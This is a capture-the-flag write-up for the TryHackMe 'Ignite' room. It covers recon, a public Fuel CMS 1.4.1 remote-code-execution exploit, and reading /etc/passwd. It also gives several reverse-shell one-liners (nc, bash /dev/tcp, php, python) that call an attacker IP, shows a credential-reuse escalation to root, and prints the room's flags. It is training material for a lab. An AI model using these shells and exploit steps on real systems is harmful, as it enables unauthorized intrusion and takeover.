# Tryhackme.com Room : Ignite
`https://tryhackme.com/room/ignite`


# Instance
```
export IP=10.10.100.30
export KALI_IP=52.48.202.232
```

# Nmap
```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```

This is a web challenge so naturally there is a web server running.
Seems to be running `FUEL CMS Version 1.4`

Run gobuster `gobuster dir -w /usr/share/dirb/wordlists/common.txt --url http://$IP`
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 200)
/assets (Status: 301)
/home (Status: 200)
/index (Status: 200)
/index.php (Status: 200)
/offline (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

`robots.txt` contains:
```
User-agent: *
Disallow: /fuel/
```
`/fuel` is the fuel cmd login page

We find an exploit for `Fuel CMS 1.4`
```
fuelCMS 1.4.1 - Remote Code Execution exploits/linux/webapps/47138.py
```

Had to modify a bit the exploit. Removed the proxy and changed the IP.
And just like that we get remote execution.

Running as :
```
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
cat /home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b
```

We got the first flag

We check `/etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
```

`sudo -l` doesn't return anything. Maybe it's asking for a password but don't see the prompt. We don't have the password for www-data anyway

We should try to get a reverse shell instead of using the web exploit.

For some reason, when using any of these method it didn't work. The cmd returned directly :

```
nc -e /bin/sh 10.10.51.182 4444

bash -i >& /dev/tcp/10.10.51.182/4444 0>&1

php -r '$sock=fsockopen("10.10.51.182",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.51.182",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

I just written the reverse shell to file
```
echo "#!/bin/bash\n\n/bin/bash -i >& /dev/tcp/10.10.51.182/4444 0>&1" > /tmp/t.sh
```

Than I `chmod +x` & `/tmp/t.sh` and we got a more usable shell

We need to get root.
Soo, we confirm that `sudo -l` ask for a password.

Can't find much with linpeas..

We find the password for the database (Not really usefull in getting root)
```
cat /var/www/html/fuel/application/config/database.php
'username' => 'root',
'password' => 'mememe',
```

Ho well, after some time trying to find exploits, I tried the database login wand got into root (lol)

Here is the root flag :
```
b9bbcb33e11b80be759c4e844862482d
```
